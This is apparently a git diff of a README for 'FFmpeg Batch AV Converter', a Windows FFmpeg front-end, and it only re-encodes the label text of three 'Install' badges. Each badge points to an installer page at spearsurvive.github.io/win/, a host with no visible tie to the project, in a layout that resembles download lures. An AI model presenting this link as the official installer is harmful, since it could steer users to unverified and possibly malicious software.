@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install FFmpeg Batch AV Converter](https://img.shields.io/badge/⬇_Install_FFmpeg%20Batch%20AV%20Converter-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FFmpeg Batch AV Converter](https://img.shields.io/badge/⬇_Install_FFmpeg+Batch+AV+Converter-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ FFmpeg Batch AV Converter is a free, user-friendly Windows front-end for the pow
 
 <div align="center">
 
-[![⬇ Install FFmpeg Batch AV Converter](https://img.shields.io/badge/⬇_Install_FFmpeg%20Batch%20AV%20Converter-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FFmpeg Batch AV Converter](https://img.shields.io/badge/⬇_Install_FFmpeg+Batch+AV+Converter-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ FFmpeg Batch AV Converter is a free, user-friendly Windows front-end for the pow
 
 <div align="center">
 
-[![⬇ Install FFmpeg Batch AV Converter](https://img.shields.io/badge/⬇_Install_FFmpeg%20Batch%20AV%20Converter-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FFmpeg Batch AV Converter](https://img.shields.io/badge/⬇_Install_FFmpeg+Batch+AV+Converter-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
